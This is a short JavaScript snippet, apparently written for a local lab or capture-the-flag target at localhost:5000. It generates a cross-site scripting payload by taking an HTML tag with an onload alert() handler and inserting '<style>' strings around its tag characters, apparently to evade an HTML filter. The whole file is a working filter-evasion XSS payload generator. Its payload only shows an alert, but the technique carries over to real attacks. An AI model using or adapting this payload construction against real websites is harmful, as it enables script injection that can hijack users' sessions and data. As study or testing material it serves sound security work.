str = "<h1 onload='alert()'></h1>"
payload = ''
nullbyte = '<style>'

for(i=0;i < str.length;i++){
     if(str[i] == '>' || str[i-1] == '<'){
	payload += str[i] + nullbyte
     }
     else{
     payload += str[i]
     }
}
//confuis = '#localhost:5000/#?'
console.log(payload)
